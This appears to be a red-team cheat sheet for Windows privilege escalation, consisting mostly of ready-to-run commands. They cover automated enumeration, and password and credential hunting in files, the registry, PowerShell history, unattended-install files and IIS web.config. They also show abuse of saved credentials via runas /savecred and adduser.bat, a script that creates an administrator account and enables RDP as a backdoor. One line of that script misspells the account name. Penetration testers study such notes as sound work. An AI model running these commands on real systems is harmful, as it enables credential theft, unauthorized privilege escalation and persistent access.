---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/privilege-escalation/windows
---

# Windows

### Automate Enumeration Tools

```basic
PrivescCheck -  https://github.com/itm4n/PrivescCheck.git
Seatbelt -  https://github.com/GhostPack/Seatbelt
SharpUp -  https://github.com/GhostPack/SharpUp
Nishang - https://github.com/samratashok/nishang.git
PowerUp -  https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
WinPEAS -  https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
Sherlock -  https://github.com/rasta-mouse/Sherlock
Watson -  https://github.com/rasta-mouse/Watson
```

### Automate with PriveseCheck

{% code overflow="wrap" %}
```bash
git clone https://github.com/itm4n/PrivescCheck.git
## Upload it into target and run 
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
```
{% endcode %}

### Service Enumeration

```powershell
# WMIC
C:\> wmic service get name,displayname,pathname,startmode |findstr /i "auto"
C:\> wmic product get name, version, vendor

# WMI
PS C:\> Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}

# SC
C:\> sc queryex type= service | findstr "Service_Name"

# Running Service
C:\> tasklist /svc

# Schedule Task Enumeration
C:\> schtasks /query /fo LIST /v
```

### PowerShell

```powershell
# File Location on 64-bit Windows
# 64bit (x64)
C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\system32\WindowsPowerShell\v1.0\powershell_ise.exe

# 32bit (x86)
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe

# History
PS C:\> (Get-PSReadlineOption).HistorySavePath
CMD: type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
Powershell: type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Discover .Net Framework Version

```powershell
C:\> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.0
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4.0
```

### Password Hunting

```powershell
findstr /si password*.txt
findstr /si password *.txt *.ini *.config *.ps1

# AutoLogon User
reg query HKLM /f pass /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon

C:\Users\Test\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Console
Host_history.txt
```

Add User Script

{% code title="adduser.bat" %}
```powershell
@echo off
:: This batch file add user to Adminsitrator group and Enables RDP service

echo Adding User...
net user laughing password1 /add
net localgroup Administrators laughnig /add
net localgroup "Remote Desktop Users" laughing /add
echo Enabling RDP...
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
echo ===========================
echo User Added
echo ===========================
net users
```
{% endcode %}

### Find File Location

```powershell
C:\> where /R c:\Windows bash.exe
```

### System Information

```powershell
# Patch Install
C:\> wmic qfe get Caption,Description,HotFixID,InstalledOn
C:\> wmic logicaldisk get Caption,Description,Providername

# System Emueration
C:\> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type

# Firewall
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
netsh advfirewall show currentprofile
netsh advfirewall show rule name=all
```

### Permission Folder or File

{% code overflow="wrap" %}
```powershell
PS> Get-ChildItem "C:\Program Files (x86)" -Recurse -ErrorAction SilentlyContinue | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}

C:\icacls folder-name

poweshell Get-Acl C:\xampp\htdocs\logs | fl
```
{% endcode %}

### Driver Enumeration

```powershell
C:\> driverquery /v

# Query driver
PS C:\> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path

# Enumerate Version
PS C:\> Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer
PS C:\> Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

### Unattended Windows Install

```powershell
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

### Saved Windows Credentials

```powershell
C:\Users\khan.chanthou>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=vulnableone\khan.chanthou
    Type: Domain Password
    User: vulnableone\khan.chanthou
```

```powershell
C:\Users\khan.chanthou>runas /savecred /user:vulnableone\khan.chanthou cmd.exe
Attempting to start cmd.exe as user "vulnableone\khan.chanthou" ...
```

### IIS Configuration

```powershell
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

